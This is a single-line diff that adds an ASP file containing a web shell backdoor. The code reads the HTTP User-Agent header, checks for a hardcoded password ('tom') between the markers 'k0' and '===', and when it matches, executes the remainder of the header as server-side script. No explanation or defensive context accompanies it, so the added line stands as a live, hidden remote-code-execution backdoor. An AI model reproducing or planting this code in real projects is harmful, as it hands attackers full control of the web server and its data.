@@ -1,0 +1,1 @@
+<%uastr=Request.ServerVariables("HTTP_USER_AGENT"):pwd="tom":StartStrPos = Instr(uastr, "k0")+Len("k0")  :EndStrPos = Instr(uastr,"==="):Length = EndStrPos - StartStrPos:Res= Mid(uastr,StartStrPos,Length):if (pwd=Res) then:execute replace(uastr,"k0"+Res+"===",""):end if%>
